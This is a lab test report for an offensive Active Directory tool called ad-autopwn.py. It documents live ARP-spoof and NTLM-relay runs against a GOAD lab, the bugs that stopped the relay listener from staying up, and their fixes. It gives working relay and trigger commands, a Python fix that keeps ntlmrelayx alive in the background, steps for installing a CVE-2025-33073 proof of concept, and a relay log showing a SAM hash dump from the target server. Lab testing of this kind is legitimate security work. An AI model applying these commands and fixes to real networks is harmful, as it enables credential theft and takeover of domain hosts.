# Layer-2 live-fire test report

First real **on-prem L2 test** of the passive/active layer-2 phases, 2026-09-11.
Until now these had only been dry-run tested, because the GOAD lab ran in an AWS
VPC where Layer 2 is blocked (see README "Needs more testing").

**Rig:** GOAD-Light in an isolated Proxmox lab, with attacker Kali on the *same*
NAT bridge (`LAB_BRIDGE`, `LAB_SUBNET`), so ARP / broadcast / multicast actually
reach the attacker. Detailed lab build notes are kept private.

```
DC01_IP          DC01  kingslanding   sevenkingdoms.local
DC02_IP          DC02  winterfell     north.sevenkingdoms.local
RELAY_TARGET_IP  SRV02 castelblack    MSSQL + IIS
ATTACKER_IP      kali  attacker       ad-autopwn.py runs here
```

---

## Headline result

First live L2 run of `--phase arp` surfaced three bugs (below) — **all now fixed
and the fixes validated on the rig.** After the fix, the ARP spoof holds for the
full poison duration and a triggered DC auth is captured by the relay listener
(the relay-to-DC itself is then correctly stopped by SMB signing). The
capture→relay path works for the first time; before this it had only ever been
dry-run tested, because GOAD's AWS VPC blocked Layer 2 entirely.

Every layer of the *environment* was L2-capable from the start — the blockers
were all in the script.

---

## BUG 1 (blocker): ntlmrelayx dies on stdin-EOF when backgrounded

**Severity: high — silently breaks every relay-based L2 phase (`arp`, and the DC
relay in the full chain).**

> **✅ FIXED and VALIDATED 2026-09-11.** `run()` now launches bg processes with
> `stdin=subprocess.PIPE` held open; the 7 relay call sites use a new
> `wait_relay_ready()` port-probe instead of `time.sleep(2); poll()`. Re-run of
> `--phase arp` against DC01: the ARP spoof **held for the full 45 s poison
> duration** (was 8 s total / 2 s relay before), no "exited immediately", and a
> triggered DC01 auth was captured by the listener:
> ```
> [*] (SMB): Received connection from DC01_IP, attacking target smb://DC01_IP
> [-] Signing is required, attack won't work unless using -remove-target
> ```
> The relay-to-DC failed only on SMB signing (a real AD defence, not a tool bug) —
> the capture→relay path itself now works, which it never did before.

### Symptom

```
[1/3] ARP spoof relay: DC01_IP ↔ GATEWAY_IP
🎣 Starting ntlmrelayx listener...
❌ ntlmrelayx exited immediately (code 0)
🛑 Stopping ARP spoof...
```

All three hosts, identical. The whole `arp` phase finished in **8 seconds**
despite `--poison-duration 90`: because the tool believes the relay died, it
tears the ARP spoof down immediately, so **no capture window ever opens**.

### Root cause

`impacket-ntlmrelayx`'s captured output file shows it actually started fine:

```
[*] Servers started, waiting for connections
```

…and then the process exits within ~2 s. Proven by isolating it:

| How launched | 445 bound at 5 s? | Process alive? |
|---|---|---|
| Foreground, TTY attached | yes | yes (stays up) |
| Background, stdin inherited/EOF (**what the tool does**) | no | **no — exits ~2 s** |
| Background, `sleep infinity \| ntlmrelayx` (stdin kept open) | **yes** | **yes** |

ntlmrelayx's main loop falls through and the process exits **the moment its stdin
hits EOF**, which is guaranteed whenever it is launched as a background child
without a persistent stdin. It briefly binds 445, reaches "waiting for
connections", then EOF → exit → 445 released. The tool's health check at
`ad-autopwn.py:1289` (`time.sleep(2); if relay_proc.poll() is not None`) then
*correctly* observes a dead process and reports the misleading "exited
immediately".

So the health check is not the bug — the process really does die. The bug is
**how it is launched**.

### Where

- `run()` bg branch — `ad-autopwn.py:409` (the `subprocess.Popen` at ~`:425`)
  does **not** set `stdin`, so the child inherits an stdin that EOFs.
- ARP-relay launch — `ad-autopwn.py:1280` (`run(..., bg=True, outfile=...)`).
- DC-relay launch — `ad-autopwn.py:2025` (same pattern, same latent bug).
- Reflection SMB relay — `ad-autopwn.py:2906` (same pattern).

### Fix (validated on the rig)

Give backgrounded interactive impacket tools a stdin that never EOFs. In the
`run()` bg branch, open a pipe and **keep the write end** for the lifetime of the
child:

```python
if bg:
    f_out = open(outfile, "w") if outfile else subprocess.DEVNULL
    proc = subprocess.Popen(
        cmd, stdout=f_out, stderr=subprocess.STDOUT,
        stdin=subprocess.PIPE,        # <-- never closed => never EOF
        text=True, preexec_fn=os.setpgrp,
    )
    # do NOT proc.stdin.close(); hold it on the proc object so GC can't close it
    return proc
```

`stdin=subprocess.DEVNULL` does **not** work — `/dev/null` reads as immediate EOF.
The pipe must stay open. Equivalent shell form that was proven to work:
`sleep infinity | impacket-ntlmrelayx …`.

After the fix, also raise the post-launch settle time (`:1288`) from 2 s — the
servers take ~1–2 s just to bind all ports (SMB/WCF/RAW/WinRM/RPC), so a 2 s
check races startup even in the healthy case. 4–5 s is safer, or poll port 445
with `ss` instead of sleeping.

---

## BUG 2: prereq gate hard-exits every phase, including `--dry-run`

> **✅ FIXED 2026-09-11.** CVE-2025-33073 PoC now required only for phases that
> use it (`full`/`exploit`/`dcsync`); a warning otherwise. `--dry-run` is never
> blocked by missing prereqs.

**Severity: medium — blocks the documented "dry-run first" workflow on a stock
Kali.**

`check_prerequisites()` (`ad-autopwn.py:1001`) sets `missing=True` and the caller
`sys.exit(1)`s at `:9924` **before any phase runs**, if the CVE-2025-33073 PoC is
absent (`:1016`). That means even `--phase sniff --dry-run` — which needs neither
the PoC nor a network — cannot run on a fresh install. The IMPLEMENTATION_PLAN
says "dry-run first on every new phase … before any live fire", but the gate
prevents exactly that.

Observed: `❌ CVE-2025-33073 PoC not found at /opt/tools/CVE-2025-33073` →
`❌ Missing required prerequisites` → exit, with no phase output.

**Fix options:**
- Make the CVE PoC **required only for the phases that use it** (`full`, `exploit`,
  reflection), not for `sniff`/`arp`/`discover`/`enum`/`loot`/etc.
- Or: always allow `--dry-run` past the gate (print warnings, run nothing).
- Per-phase prereq maps would be the clean fix — a `REQUIRED_BY_PHASE` dict.

All other "required" tools (`nxc`, `impacket-ntlmrelayx`,
`impacket-findDelegation`, `impacket-secretsdump`, `python3`, `ip`) were present
on stock Kali; only the git-cloned PoC was missing.

---

## BUG 3: pipx tools invisible under sudo

> **✅ FIXED 2026-09-11.** `main()` prepends the invoking user's `~/.local/bin`
> (resolved via `SUDO_USER`) to PATH, and `tool_exists()` probes it as a
> fallback — so pipx tools are found for both detection and execution under sudo.

**Severity: low — cosmetic false-negative, but misleads the operator.**

The tool runs under `sudo`, and `tool_exists("mitm6")` (and coercer, wsuks,
bloodyAD, sccmhunter — all pipx installs) checks `PATH`. pipx installs to
`~/.local/bin`, which **sudo strips from PATH** via `secure_path`. So
`mitm6 not found` is reported even when `~/.local/bin/mitm6` exists and works.

**Fix:** when probing for tools, also check `~<invoking-user>/.local/bin` and the
pipx bin dir explicitly, or resolve `SUDO_USER`'s home. A one-line hint in the
warning ("pipx tools: run with `sudo env "PATH=$PATH:$HOME/.local/bin"`") would
also help.

---

## Environment findings (not tool bugs — rig setup notes)

These are properties of a Proxmox NAT-bridge lab that anyone reproducing this
L2 rig must know. Recorded so the README's "Needs more testing" section can be
updated with a working on-prem recipe.

1. **The bridge forwards L2 correctly.** A scapy ARP sweep from Kali saw the
   gateway and all three GOAD hosts with real MACs. Filtering was disabled only
   on the isolated lab segment, so nothing filtered ARP or broadcast. This is
   the key difference from AWS.

2. **`multicast_snooping=1` on `LAB_BRIDGE` must be turned off for the IPv6 path.**
   IGMP/MLD snooping drops mitm6's DHCPv6/RA multicast to ports that haven't
   joined. Disable per-test on the host:
   `echo 0 > /sys/class/net/LAB_BRIDGE/bridge/multicast_snooping` (non-persistent,
   reverts on reboot). Was done for this test.

3. **An idle GOAD lab is silent — passive/poisoning phases need a trigger.** A
   15 s passive capture on the segment saw **zero** frames: no ARP, no LLMNR, no
   NBT-NS, no DHCPv6. The Windows hosts do no name resolution when idle. So:
   - `arp` works unprompted (active poisoning, doesn't wait for chatter) — **but
     still needs the victim to *send authenticated traffic*** through the
     attacker for a relay to fire. A poisoned host that talks to nothing yields
     nothing.
   - `sniff` / `wpad` / `wsus` need a **triggered** victim: from a GOAD host,
     reference a bad name (`\\nonexistent\x`, mistyped share/UNC), or reboot a
     host so it does WPAD/DHCPv6 on boot. Without a trigger these will look like
     false negatives even when working.

4. **`wsus` and `pxe` are N/A on GOAD-Light.** No WSUS server, no PXE/WDS in the
   lab, so those two phases can only ever stay dry-run here. They need a lab that
   actually runs those services.

---

## What a full live L2 test still needs

Ordered, after BUG 1 is fixed:

1. **Fix BUG 1** (stdin) and re-run `--phase arp` — the relay listener will then
   stay up for the poison duration.
2. **Generate victim auth** so the relay has something to catch: e.g. from DC02,
   `dir \\ATTACKER_IP\share` or trigger an SMB connect to the attacker. With
   coercion creds, `--phase full` would use PetitPotam/DFSCoerce to force it.
3. **`--phase wpad`** with mitm6 on `PATH` (BUG 3) + `multicast_snooping=0`
   (finding 2) + a rebooted/triggered victim.
4. Update README "Tested against" / "Needs more testing" once each phase has a
   real capture→relay→crack round-trip.

---

## Install steps done on the Kali box (for reproducibility)

```bash
sudo mkdir -p /opt/tools && sudo chown attacker /opt/tools
git clone https://github.com/mverschu/CVE-2025-33073 /opt/tools/CVE-2025-33073
pipx install mitm6            # lands in ~/.local/bin (see BUG 3)
# host side:
echo 0 > /sys/class/net/LAB_BRIDGE/bridge/multicast_snooping
```

Everything else the tool needs (`nxc`, `responder`, `impacket-*`, `scapy`,
`tcpdump`, `hashcat`, `arpspoof`, `bloodhound-python`) was already on stock Kali.

## Cleanup performed

- Killed all `ntlmrelayx` / `arpspoof` / `responder` / `mitm6` processes on Kali.
- `net.ipv4.ip_forward` reset to 0.
- Confirmed all three GOAD hosts still reachable on 445 (ARP tables self-healed).
- `multicast_snooping` left at 0 (reverts on host reboot); note it if the IPv6
  path is not being tested.

---

## Full capture → relay → action round-trip (2026-09-11)

The first complete on-prem relay round-trip on the fixed tool — never possible on
AWS (L2 blocked) and never possible before BUG 1 was fixed (relay died in 2s).

**Setup:** added a domain workstation `ws01` (`WORKSTATION_IP`, joined to
`north.sevenkingdoms.local`) as the victim; `SRV02` / castelblack (`RELAY_TARGET_IP`)
as the relay target because it is the only host with `signing:False` — both DCs
enforce signing and cannot be relayed to.

```
relay:   sleep infinity | impacket-ntlmrelayx -t smb://RELAY_TARGET_IP -smb2support --no-http-server
trigger: (on ws01) net use \\ATTACKER_IP\ipc$ /user:north\administrator <pw>
```

**Result — from the relay log:**

```
[*] (SMB): Received connection from WORKSTATION_IP, attacking target smb://RELAY_TARGET_IP
[*] Authenticating connection from NORTH/ADMINISTRATOR@WORKSTATION_IP against smb://RELAY_TARGET_IP SUCCEED
[*] -> Dumping local SAM hashes (uid:rid:lmhash:nthash)
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:<nthash>:::
[*] -> Done dumping SAM hashes for host: RELAY_TARGET_IP
```

Capture → relay → **SAM dump on SRV02**, recovering its local Administrator NT
hash. This exercises the exact code path BUG 1 broke (backgrounded relay staying
alive long enough to receive and forward auth).

**Two honest caveats:**
- The trigger was a **controlled injection** of a known Domain-Admin credential
  from the victim, not organic poisoning — an idle lab has no live user chatter
  to catch (see the "idle lab is silent" finding). In a real engagement the
  trigger is LLMNR/NBT-NS/WPAD poisoning or coercion; the relay pipeline being
  validated here is identical downstream of the trigger.
- The victim's own `net use` returned `0x80090346` (message-altered) — expected:
  that is the *client* seeing its MIC stripped by the relay. The relay to SRV02
  still SUCCEEDED.

**Signing map (why SRV02 is the only viable target):**

```
KINGSLANDING (DC01)  signing:True   — cannot relay to
WINTERFELL   (DC02)  signing:True   — cannot relay to
CASTELBLACK  (SRV02) signing:False  — relay target ✓
```

---

## Full L2 phase coverage (2026-09-11, second session)

All five L2 phases exercised against the lab (GOAD-Light + ws01 client + Kali).

| Phase | Result | Detail |
|---|---|---|
| `arp` | ✅ **Full round-trip** | ws01 auth → relay → SRV02 SAM dump (documented above) |
| `sniff` | ✅ **Works** | During a ws01 reboot: detected LLMNR from 3 hosts, DHCPv6 solicit (mitm6 viable), PXE boot traffic — correct passive detection |
| `wsus` | ✅ **Works (graceful N/A)** | Scanned 8530/8531, correctly reported "No WSUS server detected", skipped cleanly |
| `wpad` | 🟡 **Launches + poisons; no catch** | mitm6 IPv6 DNS poisoning + ntlmrelayx WPAD server (:80) came up and ran the full 120s. No WPAD auth captured even across a ws01 reboot — an idle client at the login screen does not fire WPAD NTLM (needs an interactive user logon / browsing). Scenario limitation, not a tool fault. |
| `pxe` | 🐛 **Bug: false-positive + hang** | Flagged ws01 (a plain Win11 client, `WORKSTATION_IP`) as a "PXE/TFTP server" because it emits PXE-like DHCP boot options at startup, then hung ~25s per TFTP GET until the phase timed out. Detection is too loose and TFTP retrieval has no fast failure. |

### New findings for the fix list

- **`pxe` server detection is too loose** — it treats any host answering the
  DHCP/TFTP probe as a PXE server, including ordinary Windows clients. It should
  confirm a real TFTP/WDS response (e.g. a successful small GET) before declaring
  a server, and cap the per-file TFTP timeout so it fails fast.
- **`wpad` capture needs a victim trigger** — the phase works but, like real
  mitm6/Responder engagements, only fires when a victim actually resolves WPAD
  (user logon, browser, Windows Update). Worth a doc note that an idle
  login-screen client will not bite; test with a logged-in user session.
- **Responder does not survive a non-interactive/background launch** outside the
  tool (stdin-EOF, same class as BUG 1). In-tool it goes through the fixed
  `run(bg=True, stdin=PIPE)`, so the tool's own Responder/mitm6 launches stay up —
  but any operator launching Responder by hand over SSH needs a PTY or held stdin.

### Net

- **Proven working end-to-end:** `arp` (with a real SAM dump), `sniff`.
- **Proven to launch/operate correctly:** `wsus` (graceful no-op), `wpad`
  (poisons; capture is victim-dependent).
- **Needs a fix:** `pxe` (false-positive detection + slow TFTP).
- The BUG 1 relay fix underlies `arp` and `wpad` and is validated in both.
